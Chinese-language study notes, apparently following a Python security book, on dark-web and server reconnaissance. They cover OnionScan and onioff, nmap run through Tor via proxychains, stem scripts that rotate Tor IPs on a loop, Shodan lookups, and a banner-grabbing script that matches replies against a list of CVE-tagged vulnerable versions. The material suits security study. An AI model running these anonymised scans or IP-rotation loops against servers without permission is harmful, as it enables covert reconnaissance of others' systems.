sudo apt install python3 python3-pip git
git clone https://github.com/k4m4/onioff.git
cd onioff
pip3 install -r requirements.txt
```
然後對於程式的某段進行修改  
```python
def connectTor():
    global pure_ip

    ipcheck_url = 'https://locate.now.sh/ip'
    pure_ip = requests.get(ipcheck_url).text.replace('\n','')
```
這段程式中的
```python
pure_ip = requests.get(ipcheck_url).text.replace('\n','')
```
改成
```python
pure_ip = 1
```
底下一點的位置有另一行
```python
tor_ip = requests.get(ipcheck_url).text.replace('\n','')
```
修改為
```python
tor_ip = 2
```
這樣就可以運作了  

先如同先前的教學，我們打開tor服務之後才能執行。  
```
tor --SocksPort 9050 --ControlPort 9051 &
```
我們先執行一個有效的網址
```
python3 onioff.py  http://cnkj6nippubgycuj.onion/
```
結果為
```
[+] Commencing onion inspection
[+] Tor running normally
[O] http://cnkj6nippubgycuj.onion/ (ACTIVE) ==> 'Torch : The Tor Search Engine'
[!] Onion inspection successfully complete
[!] Inspection report saved as --> reports/onioff_2021-06-15_16:02:40.txt
Comp/tional time elapsed: 0.07824425500000001
```
找到了，並且顯示是torch搜尋引擎。  

也可以將幾個網址裝在文字檔裡頭，然後將查詢結果輸出到文字檔，方法如下：  
```
python3 onioff.py -f onion_urls.txt -o output_report.txt
```

(p.175)

<span id="onion_scan"></span>
### 檢查暗網網址匿名性與弱點檢查

OnionScan是個可以對暗網網站進行弱點與匿名性掃描的工具。  
能幫助研究人員監測與追蹤暗網網址。  

由於是由Golang語言撰寫成的，所以必須先裝Golang編譯器。
```
sudo apt install golang
```
使用go get指令對github儲存庫進行下載：
```
go get github.com/s-rah/onionscan
```

下載完之後，會除存在使用者的家目錄，如/home/使用者名稱，如果是root則是儲存在/root。  

編譯與安裝:  
```
go install github.com/s-rah/onionscan
```
編譯好的檔案，如果跟我一樣使用root使用者，就會在以下路徑。  
如果是別的使用者，應該會是/home/使用者名稱/go/bin/onionscan 
```
/root/go/bin/onionscan 
```
把go可執行檔應用程式加入環境變數  
```
export PATH=$PATH:/root/go/bin
```
加入環境變數後  
這樣可以在任何目錄直接輸入onionscan後啟動程式  

不過在這之前，我們要先把需要的依賴套件安裝好:
```
go get golang.org/x/net/proxy
go install golang.org/x/net/proxy

go get golang.org/x/net/html 
go install golang.org/x/net/html 

go get github.com/HouzuoGuo/tiedot/db
go install github.com/HouzuoGuo/tiedot/db
```
然後我們在下列連結找找火炬搜尋引擎的網址  
https://www.torsearch.org/

將網址進行簡單掃描
```
onionscan http://cnkj6nippubgycuj.onion/
```
掃描結果大概如下
```
＃列出一些網站上頭的連結
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- clearnetlink ---> http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion/advertising/?site=torch (uri)
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- clearnetlink ---> http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion/?banner-click=639 (uri)

...

2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- links ---> bcjesshiqpnjlaad.onion (uri)
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- links ---> ey7vqtmrhopjyqyd.onion (uri)

...

#列出一些關於網站的訊息
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- crawl ---> Expires:Thu, 19 Nov 1981 08:52:00 GMT (http-header)
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- crawl ---> Server:nginx (http-header)
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- crawl ---> Content-Type:text/html; charset=UTF-8 (http-header)
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- crawl ---> Connection:keep-alive (http-header)
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- crawl ---> Date:Wed, 16 Jun 2021 09:26:33 GMT (http-header)
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- crawl ---> Pragma:no-cache (http-header)
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- crawl ---> Set-Cookie:PHPSESSID=cr520t98c8i410ie5f8lm0ts4a; path=/ (http-header)
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- crawl ---> Vary:Accept-Encoding (http-header)
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- crawl ---> Cache-Control:no-store, no-cache, must-revalidate (http-header)
2021/06/16 09:27:53 Inserting cnkj6nippubgycuj.onion --- crawl ---> Torch : The Tor Search Engine (page-info)

...

#報告:沒有風險被發現
--------------- OnionScan Report ---------------
Generating Report for: cnkj6nippubgycuj.onion

No risks were found.

```
詳細掃描
```
 onionscan --verbose  http://cnkj6nippubgycuj.onion/
```
結果分析
```
2021/06/16 09:40:56 Starting Scan of http://cnkj6nippubgycuj.onion/
2021/06/16 09:40:56 This might take a few minutes..

#找到打開的80port
2021/06/16 09:40:56 INFO: Checking cnkj6nippubgycuj.onion http(80)
2021/06/16 09:41:08 INFO: Found potential service on http(80)

#發現伺服器狀態頁面
2021/06/16 09:41:08 INFO: Scanning URI: http://cnkj6nippubgycuj.onion/server-status
2021/06/16 09:41:21 INFO: Grabbed 21729 byte document

#發現私鑰頁面
2021/06/16 09:41:21 INFO: Scanning URI: http://cnkj6nippubgycuj.onion/private_key
2021/06/16 09:41:25 INFO: Grabbed 21729 byte document

#443與22port沒開
2021/06/16 09:41:25 INFO: Checking cnkj6nippubgycuj.onion TLS(443)
2021/06/16 09:41:27 INFO: Failed to connect to service on port 443
2021/06/16 09:41:27 INFO: Checking cnkj6nippubgycuj.onion ssh(22)
2021/06/16 09:41:33 INFO: Failed to connect to service on port 22


```
<span id="ExifTool"></span>
### ExifTool來觀察圖片的元數據
圖片是什麼我們知道，但是圖片的"元數據"又是什麼呢？  
例如修改日期，或是大小，註解...等等。  
無論我們可以取得多少元數據，這些都可以成為我們追蹤某個網站或資料流向的線索。  
這裡有個提取圖片元數據的軟體  

ExifTool:
https://exiftool.org/

我們也可以用apt進行下載，來嘗試觀察元數據。  
(p.176)


<span id="DockerOnionNmap"></span>
### DockerOnionNmap隱藏自身位置進行NMAP掃描
有個整合好的docker容器可以直接透過tor網路進行掃描  
```
docker run --rm -it milesrichardson/onion-nmap -p 80,443 網址(onion或一般網站都可以)
```
也可以登入docker容器後輸入指令啟動
```
docker run -d -it milesrichardson/onion-nmap bash 網址(onion或一般網站都可以)
```
```
docker exec -it 容器ID bash
```
```
proxychains -f /etc/proxychains.conf /usr/bin/nmap -sT -PN -n -p 80,443 <onion_address>
```

<a href="#menu-location">跳到目錄</a>  

<span id="ProxychainsOnionDNS"></span>
### Proxychains與Onion網址
如果自己寫的程式沒有辦法存取Onion網址的話，可以直接嘗試透過Proxychains來連線，預設Proxychains可以通過Onion的DNS來進行連線，也就是如果透過Proxychains是可以讓應用程式連到Onion網址或API的。  

<span id="FromPythonToTor"></span>
### 使python程式連結到tor網路

在本章節，我們可以透過stem,requests 與 socks5 互相結合，來實現通過SOCKS代理來進行通訊。  

### stem模塊
此模塊有辦法對tor 實例進行一系列操作，並且取得通過的中繼。  

### torrequest模塊
包裝了stem與requests的模塊。  

### pysocks模塊
pysocks可以透過python與SOCKS proxy伺服器進行通訊。  

### 透過requests與pysocks連上SOCKS
pip安裝模塊
```
pip3 install pysocks
pip3 install requests
```
pysocks模塊安裝之後，才能夠啟用requests的SOCKS proxy功能，如果沒有安裝，會進行報錯。  
以下我們透過socks5使用requests，取得網站IP並且進行比較。  
```python
import requests

def get_tor_session():
    session = requests.session()

    # Tor 使用 9050 port作為預設的socket port
    session.proxies = {'http':  'socks5://127.0.0.1:9050',
                       'https': 'socks5://127.0.0.1:9050'}
    return session

# 顯示在正常情況下的IP
print("Normal Public IP:",requests.get("http://httpbin.org/ip").text)

# 顯示通過Tor網路時的IP
session = get_tor_session()
print("IP for Tor connection:",session.get("http://httpbin.org/ip").text)

# 兩個IP應該要不相同

```
不過根據書本上的範例我發覺，目前已經不能在使用requests設置proxy的方式來找到.onion的網址了。  
所以這代表要使用專用的模塊torrequest來達成該任務。  


<a href="#menu-location">跳到目錄</a>  

### 安裝torrequest
```
pip3 install stem
pip3 install requests
pip3 install torrequest
```
要安裝此模塊，就必須安裝相依賴的模塊stem,requests。  
除此之外，tor服務必須安裝啟動，並且在9051 port開啟控制port。(可以選擇其他port)  

我們可以在代碼torrequest.py中看見直接引用了stem與requests  
https://github.com/erdiaker/torrequest/blob/master/torrequest.py  
```python
from torrequest import TorRequest

with TorRequest(proxy_port=9050, ctrl_port=9051, password=None) as tr:
    response = tr.get('http://ipecho.net/plain')
    print(response.text)  # 結果不會是你原本的IP位置
    print(type(tr.ctrl))            # 我們發現TorRequest的控制物件其實是模塊stem.control.Controller 物件
    tr.ctrl.signal('CLEARDNSCACHE') # 參見Stem 的文檔
    tr.reset_identity() #重設IP

#一定要徹底重建一個新的requests物件才能真正切換IP  (此處經過個人修改)
with TorRequest(proxy_port=9050, ctrl_port=9051, password=None) as tr:
    response = tr.get('http://ipecho.net/plain')
    print(response.text)  # another IP address
```
(p.179)

### torpy模塊實做

另外一種方式就是用torpy  
是純粹python的tor傳輸協定實做。  
不需要額外的客戶端，也不需要stem模塊的支持。  

以下是torpy專案:  
https://github.com/torpyorg/torpy  

以下範例  
```python
from torpy.http.requests import TorRequests

with TorRequests() as tor_requests:
    print("building circuit...")
    with tor_requests.get_session() as session:
        print(session.get("http://httpbin.org/ip").json())
    print("renewing circuit...")
    with tor_requests.get_session() as session:
        print(session.get("http://httpbin.org/ip").json())
    
```

對了，Tor網路上頭onion的服務現在已經沒有辦法用這個模塊存取了，  
因為多數服務更新到V3，但這個模塊只能存取V2的各項服務。  

(p.181)  


<span id="TorSocks&Socket"></span>
### 用Tor的SocksProxy進行socket傳輸

由於某些情況，我們還是需要用到TCP/UDP，這類傳輸層協定來撰寫通訊程式(例如，有比較好的效率)。  
所以有什麼方式可以不借外部程式的進行Tor傳輸呢？  

Socks是一種通訊方式，可以通過某個代理伺服器，來轉送你對網路的傳輸請求。  
我們在此處要用Socks與Socket進行通訊。  

```python3
import socks
import socket
import requests

########啟動proxy########

#用來覆蓋原生socket.create_connection函數的替代函數
def create_connection_override(address, timeout=None, source_address=None):
    sock = socks.socksocket()#socks的socket連結
    sock.connect(address)#回傳連結物件
    return sock

#用來覆蓋原生socket.socket物件的替代物件
def socket_override(host,port):
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, host, port, True)
    return socks.socksocket

#啟動proxy，覆蓋原本python預設的socket.socket物件，把該物件換成設置好proxy的連線物件。
def enable_proxy(host, port):
    socket.socket = socket_override(host,port)
    socket.create_connection = create_connection_override



########測試########

#用URL取得網頁內容
url = 'http://icanhazip.com'
#啟動函數，覆蓋原生的socket
enable_proxy('127.0.0.1',9050) 
#由於requests底層直接調用socket，所以我們對socket的覆蓋，對requests是有效的。
print('requests: %s' % requests.get(url).text)
```
如果要切換proxy後切換回一般狀態，可以用下列的方式來完成:

```python
import socks
import socket

temp_socket = socket.socket
temp_create_connection = socket.create_connection

def disable_proxy():
    socket.socket = temp_socket
    socket.create_connection = temp_create_connection
    

def enable_proxy(host="127.0.0.1", port=9050):
    
    def create_connection(address, timeout=None, source_address=None):
        sock = socks.socksocket()
        sock.connect(address)
        return sock
    
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, host, port, True)
    socket.socket = socks.socksocket
    socket.create_connection = create_connection
```

(p.183)

<a href="#menu-location">跳到目錄</a>  

<span id="tor&stem"></span>
### Stem模塊控制Tor行為
stem模塊可以用來操控Tor的行為，例如取得一個新的IP位址。  
也可以透過Tor發掘其他可用節點。  

要啟動的話，一定要打開tor的9051 port，來接收控制訊號。  

我們可以用Signal方法來取得新的身份與建立新的鍊路。  
如果要了解這個方法可以傳送什麼訊號，可以參見以下文件:  

https://gitweb.torproject.org/torspec.git/tree/control-spec.txt  

```
3.7. SIGNAL

  Sent from the client to the server. The syntax is:

     "SIGNAL" SP Signal CRLF

     Signal = "RELOAD" / "SHUTDOWN" / "DUMP" / "DEBUG" / "HALT" /
              "HUP" / "INT" / "USR1" / "USR2" / "TERM" / "NEWNYM" /
              "CLEARDNSCACHE" / "HEARTBEAT" / "ACTIVE" / "DORMANT"

  The meaning of the signals are:

      RELOAD    -- Reload: reload config items.
      SHUTDOWN  -- Controlled shutdown: if server is an OP, exit immediately.
                   If it's an OR, close listeners and exit after
                   ShutdownWaitLength seconds.
      DUMP      -- Dump stats: log information about open connections and
                   circuits.
      DEBUG     -- Debug: switch all open logs to loglevel debug.
      HALT      -- Immediate shutdown: clean up and exit now.
      CLEARDNSCACHE -- Forget the client-side cached IPs for all hostnames.
      NEWNYM    -- Switch to clean circuits, so new application requests
                   don't share any circuits with old ones.  Also clears
                   the client-side DNS cache.  (Tor MAY rate-limit its
                   response to this signal.)
      HEARTBEAT -- Make Tor dump an unscheduled Heartbeat message to log.
      DORMANT   -- Tell Tor to become "dormant".  A dormant Tor will
                   try to avoid CPU and network usage until it receives
                   user-initiated network request.  (Don't use this
                   on relays or hidden services yet!)
      ACTIVE    -- Tell Tor to stop being "dormant", as if it had received
                   a user-initiated network request.

  The server responds with "250 OK" if the signal is recognized (or simply
  closes the socket if it was asked to close immediately), or "552
  Unrecognized signal" if the signal is unrecognized.

  Note that not all of these signals have POSIX signal equivalents.  The
  ones that do are as below.  You may also use these POSIX names for the
  signal that have them.

      RELOAD: HUP
      SHUTDOWN: INT
      HALT: TERM
      DUMP: USR1
      DEBUG: USR2

  [SIGNAL DORMANT and SIGNAL ACTIVE were added in 0.4.0.1-alpha.]
```
我們能透過三種方法，啟動Tor的命令解釋器:  
(P.184)
1. 用Tor Controller class中的兩個方法 get_server_descriptors() 與 get_network_statuses()來實現。  
2. 用DescriptorReader物件  
3. 下載parse_file套件來用  

對用戶傳達tor服務當前狀態的工具，在stem文檔裡頭被稱為descriptors。  
例如:當你跟中繼節點聯繫時，中繼節點會發送自己的descriptor給你，可以去/var/lib/tor/cached-descriptors瞧瞧。  

我們可以用下列指令瞧瞧，中繼節點給我們什麼訊息:
```
cat cached-microdescs
```
可能會看到這樣

```
@last-listed 2021-06-20 09:29:39
onion-key
-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBAOBcoISMqpRm6Mic7QUuHJrYcP8DiZop1yQw7h1p1mcPswJFePdVROGI
Ulz7hdIbSYj3PaQp135mkPv8ao4sOtacwzjF77FVO+Dyf9i+B+X2gxhd/YqGBwKk
acFDWNvC5UO2NPVGe64YDxtxEDv55nTjQWdkDWwkXyTVtHGMqehfAgMBAAE=
-----END RSA PUBLIC KEY-----
ntor-onion-key uVepUS0PiB8yMsZUfzi7+bpTpVZPFvBbfu25HdmQj2Q
id ed25519 PzwkJGrCxORy7Q7m1l6TFjOsM3jPM2EZmgDzFiQA3TA
@last-listed 2021-06-20 09:29:42
onion-key
-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBAMoQftNgroVn+ne2hDFj4SRCkmMG5m88nbPC5T77NQa+4MXW22PUnTSS
jft69zGJ3aA4tabReG5z69Gh4ENBUl1LWc9DTl/AB6q/o7DSVP1w9ULQRCVbqbY/
LC4XIQJuDAwYkWRQf9i7jXLEFLZ0iFt8HBmQ56GWkDUQqKaSrgpHAgMBAAE=
-----END RSA PUBLIC KEY-----
...
```

裡頭有金鑰，有IP，時間頻寬。

descriptors有以下數種:
1. Server descriptor:已經不再提供下載，被 micro descriptors取代。  
2. ExtraInfo descriptor:中繼節點統計訊息。  
3. Micro descriptor:保存著對用戶必要的訊息。  
4. Consensus：中繼節點與網路狀態，查看方式:  
    ```
    cat /var/lib/tor/cached-microdesc-consensus
    ```
5. Router Status Entry:中繼節點連線狀態，查看方式:  
    ```
    cat /var/lib/tor/state
    ```
### 用Stem模塊查看中繼節點與用戶自身訊息
我們可以用以下程式存取descriptors。  
我們可以看到節點的暱稱，指紋(Fingerprint)，IP，頻寬。  
```python
from stem.descriptor.remote import DescriptorDownloader

downloader = DescriptorDownloader()
descriptors = downloader.get_consensus().run()

for descriptor in descriptors:
    print('Nickname:',descriptor.nickname)
    print('Fingerprint:',descriptor.fingerprint)
    print('Address:',descriptor.address)
    print('Bandwidth:',descriptor.bandwidth)
```
而以下的程式可以顯示通訊鍊路的狀態:
```python
from stem.control import Controller

controller = Controller.from_port(port=9051)
controller.authenticate()

print(controller.get_info('circuit-status'))
```
### 用Stem模塊列出所有通過的鍊路:
列出所有通過的鍊路:
```python
from stem import CircStatus
from stem.control import Controller

with Controller.from_port(port = 9051) as controller:
  controller.authenticate()

  for circ in sorted(controller.get_circuits()):
    if circ.status != CircStatus.BUILT:
      continue

    print("Circuit %s (%s)" % (circ.id, circ.purpose))

    for i, entry in enumerate(circ.path):
      div = '+' if (i == len(circ.path) - 1) else '|'
      fingerprint, nickname = entry

      desc = controller.get_network_status(fingerprint, None)
      address = desc.address if desc else 'unknown'

      print(" %s- %s (%s, %s)" % (div, fingerprint, nickname, address))
```
我們可以看到通過的鍊路
```
Circuit 1 (GENERAL)
 |- E459E02374D0385D2E2515CBBE707EA208966BCF (AsiaArgento, 163.172.94.119)
 |- F7B8A4B5F16ECDF6CA626F96F4E3C219D1A664EC (kerneloopsRelay, 85.25.185.17)
 +- 561A9288E617841BB438F75973D2CD001AA4BD7F (PawNetRed, 185.83.214.69)
Circuit 3 (GENERAL)
 |- E459E02374D0385D2E2515CBBE707EA208966BCF (AsiaArgento, 163.172.94.119)
 |- FCD52578ED1DA778B918D3E6B95068542203D20F (eAMsAZSXYb4Ufcq5, 116.202.14.80)
 +- E014AFBDB463DAD0BABC4868C9B4DF4AAA72F1E9 (Labitat2, 185.38.175.72)

```

我們可以查看文檔了解更多:  
https://stem.torproject.org/api/descriptor/server_descriptor.html#stem.descriptor.server_descriptor.RelayDescriptor  

### 下載取得節點伺服器資訊的python
```python
from stem.descriptor.remote import DescriptorDownloader

downloader = DescriptorDownloader()

descriptors = downloader.get_server_descriptors().run()

for descriptor in descriptors:
    print('Descriptor', str(descriptor))
    print('Certificate', descriptor.certificate)
    print('ONion key', descriptor.onion_key)
    print('Signing key', descriptor.signing_key)
    print('Signature', descriptor.signature)

```

文檔:  
https://stem.torproject.org/tutorials/mirror_mirror_on_the_wall.html.

### 用洋蔥網址取得知道該網址的節點

我們使用.onion網址建立服務的時候，會有數個洋蔥伺服器如DNS一般知道我們的網址，並且能夠對我們進行聯繫，雖然伺服器本身不清楚我們的實際位置，但伺服器知道去找哪些節點來聯繫我們。  

以下我們會用洋蔥網址反查"知道如何聯繫該網址服務的中繼節點伺服器"

以下網址是duckduckgo搜尋引擎的洋蔥網址:  
3g2upl4pq6kufc4m.onion



```python
from stem.control import Controller

with Controller.from_port(port = 9051) as controller:
  controller.authenticate()
  desc = controller.get_hidden_service_descriptor('3g2upl4pq6kufc4m')

  print("DuckDuckGo's introduction points are...\n")

  for introduction_point in desc.introduction_points():
    print('  %s:%s => %s' % (introduction_point.address, introduction_point.port, introduction_point.identifier))
```
結果
```
  193.11.114.45:9002 => qcvprvmvnjb4dfyqjtxskugniliwlrx3
  190.2.145.7:9001 => pqrorgvwedtx34nuum3ypjpmh4vljkgr
  51.222.125.21:9001 => kcp4sxyuorvfpwqhfq4upsisajsg5gfz
  140.238.210.72:9001 => up2r4fqp66hjypcncj5vznbwqcb5b7u4
  148.251.81.237:9001 => aa6snxbl6lym5p76opwdt3f26ha5bjtp
  51.91.73.194:9001 => qnml3wu4tjuawtr2fae6lqsplm3cjvoc
  37.120.167.149:9001 => smlbp6zbjfhnese5jacu7dhcnl3no6fc
  195.123.247.57:443 => qfg4a6yxk3rc2ga6sqx2h27jfkwocdmb
  212.51.149.193:9001 => etmvrmsizvyl6qi4m5ihsxvqmprqbqet
  91.219.238.120:443 => ho7z3ggh2bmnpqxgb5v2lpkxjs2ph7rg
```
上述這些伺服器都知道duckduckgo的存在。  

這些知道如何與該網址背後服務聯絡的伺服器稱為introduction points。  

細節建議閱讀該網站:  
https://community.torproject.org/onion-services/overview/

<span id="tor&stem&ip_change"></span>
### 用stem轉換洋蔥IP

最簡單的切換洋蔥IP的方法。
```python
from stem import Signal
from stem.control import Controller

with Controller.from_port(port = 9051) as controller:
    controller.authenticate()
    controller.signal(Signal.NEWNYM) 
```
以下這兩行就是會IP的關鍵
```python
controller.authenticate()
controller.signal(Signal.NEWNYM) 
```
以下是個實做切換洋蔥IP的範例：
```python
import time
from stem import Signal
from stem.control import Controller

import requests

def get_tor_session():
    session = requests.session()
    #修改proxy設定
    session.proxies = {'http':  'socks5h://127.0.0.1:9050','https': 'socks5h://127.0.0.1:9050'}
    return session

def main():
    while True:
        time.sleep(5)
        print ("Rotating IP")
        with Controller.from_port(port = 9051) as controller:
          #以下兩段為切換IP
          controller.authenticate()
          controller.signal(Signal.NEWNYM) #gets new identity
        session = get_tor_session()
        print(session.get("http://httpbin.org/ip").text)

if __name__ == '__main__':
    main()

```
我們甚至可以用以下的code手動設置每隔一段時間切換Tor IP。
```python
controller.get_newnym_wait()
```
下方式應用socket進行tor並且切換IP的範例。  
```python
import time, socks, socket
import requests
from stem import Signal
from stem.control import Controller

numberIPAddresses=5

with Controller.from_port(port = 9051) as controller:
    controller.authenticate()
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket

    for i in range(0, numberIPAddresses):
        newIPAddress = requests.get("http://icanhazip.com").text
        print("NewIP Address: %s" % newIPAddress)
        controller.signal(Signal.NEWNYM)
        if controller.is_newnym_available() == False:
            print("Waiting time for Tor to change IP: "+ str(controller.get_newnym_wait()) +" seconds")
            time.sleep(controller.get_newnym_wait())
            
    controller.close()
```
(p.191)

<a href="#menu-location">跳到目錄</a>  

<span id="serverscript"></span>
# 第三章 伺服器腳本與port掃描
(p.196)  
本章節將會介紹如何取得伺服器的開放資訊。  

本章將會學習到使用Shodan與BinaryEdge等服務，  
來進行banner grabbing(取得網站伺服器的公開資訊，如作業系統，伺服器軟體與版本，修改日期等)。  

並且也會討論如何使用DNS模塊，來取得DNS相關的訊息，並且對伺服器進行fuzzing測試。  

下列的主題將會在本章節被探討:

1. Shodan上頭取得資訊  
2. 使用BinaryEdge search搜尋引擎  
3. socket模塊取得伺服器訊息  
4. DNSPython模塊取得DNS訊息  
5. 用Fuzzing測試了解伺服器的弱點  

<span id="about-shodan"></span>

# 關於Shodan

shodan來自Sentient Hyper-Optimized Data Access Network 的縮寫。簡單來說就是比一般搜尋引擎能提供更多網站與伺服器的背景資料，甚至暴露隱藏在網路上的物連網設施。  

shodan可以找到開放的服務與port(有沒有發現，該好好改port了。)

有幾種方式可以存取Shodan:

1. 透過Shodan網頁界面  
2. 透過 RESTful API  
3. python shodan 模塊  

雖然shodan模塊或API可以用程式自動搜索，但是要先申請會員，並且取得API key:

shodan網站:  
https://www.shodan.io/  

在撰寫這篇文章的時候，每個免費會員一個月有100*100的額度，使用API進行搜索。  

API中的搜尋方式(以下為GET法):  
```
/shodan/host/{ip}
/shodan/host/count
/shodan/host/search
/shodan/host/search/facets
/shodan/host/search/filters
/shodan/host/search/tokens
...
```
詳細的API請參見底下網站：  
https://developer.shodan.io/api  

實際上使用API搜尋NGINX主題的方法:  
```
https://api.shodan.io/shodan/host/search?key=你的API金鑰&query=nginx
```
這樣可以找到一些特定IP,DNS或地理資訊。  

## 簡單取得伺服器資訊

使用前請加入環境變數
```
export SHODAN_API_KEY=你的API key
```

然後執行下列程式，這個程式會對1.1.1.1的Cloudflare公司DNS進行搜索。

```python
#!/usr/bin/env python

import requests
import os

SHODAN_API_KEY = os.environ['SHODAN_API_KEY']
ip = '1.1.1.1'

def ShodanInfo(ip):
    try:
        result = requests.get(f"https://api.shodan.io/shodan/host/{ip}?key={SHODAN_API_KEY}&minify=True").json()
    except Exception as exception:
        result = {"error":"Information not available"}
    return result

print(ShodanInfo(ip))
```
搜索結果，顯示了伺服器的訊息，所屬公司與一些描述。  
```
{'region_code': 'FL', 'ip': 16843009, 'postal_code': None, 'country_code': 'US', 'city': 'Miami', 'dma_code': None, 'last_update': '2021-06-23T06:04:22.439573', 'latitude': 25.7867, 'tags': [], 'area_code': None, 'country_name': 'United States', 'hostnames': ['one.one.one.one'], 'org': 'APNIC and Cloudflare DNS Resolver project', 'data': [], 'asn': 'AS13335', 'isp': 'Cloudflare, Inc.', 'longitude': -80.18, 'country_code3': None, 'domains': ['one.one'], 'ip_str': '1.1.1.1', 'os': None, 'ports': [53]}
```
(p.202)

(p.202~p.211 中間為SHODAN搜尋引擎的使用方法，該段先略過)

<span id="socket-server-info"></span>
## 用socket取得伺服器基本訊息
(p.211)  
Banner，它的意思是伺服器的一些基本訊息，或者說自我介紹，不一定要用特定搜尋引擎取的，因為伺服器往往在你提出請求的時候，進行響應時會附上這些訊息。  

這些訊息甚至涉及到Node.js的版本，或者是Python,PHP的版本。  

以下將示範如何用socket來取的伺服器的banner。  

get_banner_server.py
```python
import socket
import argparse
import re

parser = argparse.ArgumentParser(description='Get banner server')

######## 取得參數 ########
parser.add_argument("--target", dest="target", help="target IP", required=True)
parser.add_argument("--port", dest="port", help="port", type=int, required=True)
parsed_args = parser.parse_args()

######## 設定socket ########
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((parsed_args.target, parsed_args.port))
sock.settimeout(2) #設定超時時間

######## 拼出socket request字串 ########
query = "GET / HTTP/1.1\nHost: "+parsed_args.target+"\n\n"
http_get = bytes(query,'utf-8')

######## 接收字串 ########
data = ''

######## 將有弱點的清單放入vulnbanners變數 ########
with open('vulnbanners.txt', 'r') as file:
    vulnbanners = file.readlines()

######## socket從伺服器接收回應 ########
try:
    sock.sendall(http_get)
    data = sock.recv(1024)
    print("\n######## 接收到的原始數據 ########\n")
    print(data,"\n")

    ######## 將接收的數據轉成換行的形式 ########
    headers = data.splitlines()#將取得的字串以\n分隔切割成list，每行變成一個元素
    print("\n######## 調整後的數據 ########\n")
    for header in headers: #遍歷每個元素
        try:
            if re.search('Server:', str(header)): #如果找到Server參數
                print("*****"+header.decode("utf-8")+"*****\n") #顯示Server參數，這個參數表示伺服器軟體
            else:
                print(header.decode("utf-8")) #非Server參數，直接顯示
        except Exception as exception:
            pass

    ######## 如果有風險的伺服器軟體型號存在字串中，進行顯示 ########
    for vulnbanner in vulnbanners:
        if vulnbanner.strip() in str(data.strip().decode("utf-8")):
            print('Found server vulnerable! ', vulnbanner)
            print('Target: '+str(parsed_args.target))
            print('Port: '+str(parsed_args.port))
######## 連線失敗直接報錯 ########
except socket.error:
	print ("Socket error", socket.errno)
finally:
	sock.close()
		
```
並且，我們要建立一個檢查伺服器回應是否涵蓋有漏洞的伺服器版本的機制。  
我們把有漏洞的伺服器版本儲存在vulnbanners.txt  
不過這做不一定準確，這僅僅只是個範例(依照範例網站的內容)。  
我們必須仔細修改漏洞清單的內容。  

vulnbanners.txt
```
SSH-2.0- OpenSSH_4.7p1 Debian-Bubuntu1
220 ProFTPD 1.3.1 Server (Debian)
Apache/2.2.2 CVE-2017-7679
Apache/2.3.20 CVE-2016-4438
Apache/2.3.18 CVE-2016-4979
```

<span id="vulnerabilities-info"></span>
常見的漏洞清單網站:  
https://www.internetbankingaudits.com/list_of_vulnerabilities.htm#TCP/IP

不過上述的腳本僅可以用於檢查相對不完整的伺服器，如果只用簡單的Header很有可能會回應400 Bad Request。  

我們來試試用在python的網站上吧～  

```
python3 get_banner_server.py --target www.python.org --port 80
```
結果
```
######## 接收到的原始數據 ########

b'HTTP/1.1 301 Moved Permanently\r\nServer: Varnish\r\nRetry-After: 0\r\nLocation: https://www.python.org/\r\nContent-Length: 0\r\nAccept-Ranges: bytes\r\nDate: Thu, 24 Jun 2021 03:23:40 GMT\r\nVia: 1.1 varnish\r\nConnection: close\r\nX-Served-By: cache-hkg17924-HKG\r\nX-Cache: HIT\r\nX-Cache-Hits: 0\r\nX-Timer: S1624505020.042782,VS0,VE0\r\nStrict-Transport-Security: max-age=63072000; includeSubDomains\r\n\r\n' 


######## 調整後的數據 ########

HTTP/1.1 301 Moved Permanently
*****Server: Varnish*****

Retry-After: 0
Location: https://www.python.org/
Content-Length: 0
Accept-Ranges: bytes
Date: Thu, 24 Jun 2021 03:23:40 GMT
Via: 1.1 varnish
Connection: close
X-Served-By: cache-hkg17924-HKG
X-Cache: HIT
X-Cache-Hits: 0
X-Timer: S1624505020.042782,VS0,VE0
Strict-Transport-Security: max-age=63072000; includeSubDomains

```

<span id="dns-python-info"></span>  

## 查詢DNS相關資訊

用最簡單的說法，DNS的功能是把網址或email變成IP，把IP變成網址或email。  
提供DNS查詢的伺服器稱為DNS server，會打開 53 port以UDP的方式接受我們的查詢。  

這個章節會討論DNS的查詢。  

我們在linux裡頭可以用nslookup指令來找到特定網址背後的IP

```
root@fa44313619cd:/client/lab# nslookup www.google.com
Server:		192.168.42.129
Address:	192.168.42.129#53

Non-authoritative answer:
Name:	www.google.com
Address: 172.217.160.68
Name:	www.google.com
Address: 2404:6800:4012::2004
```
(p.215)

我們要發給DNS進行查詢時，有幾種查詢的種類，我們必須告訴DNS

1.  A: 查詢IPv4的位址。
2.  AAAA: 查詢IPv6的位址。
3.  MX: 查詢郵件伺服器的位址。  
4.  SOA (Start of Authority): 裡頭包含這個網址所屬的DNS區域，像是example\.edu與example\.org就算是不同的DNS區域了。 

    裡頭涵蓋負責人的email，還有TTL(封包最多可以跳過幾個節點)，更新時間等訊息。  
 
    DNS區域相關知識:  
    https://www.cloudflare.com/zh-tw/learning/dns/glossary/dns-zone/  
    https://en.wikipedia.org/wiki/DNS_zone_transfer  

    SOA詳細涵蓋哪些資訊可以查看這裡:  
    https://en.wikipedia.org/wiki/SOA_record  
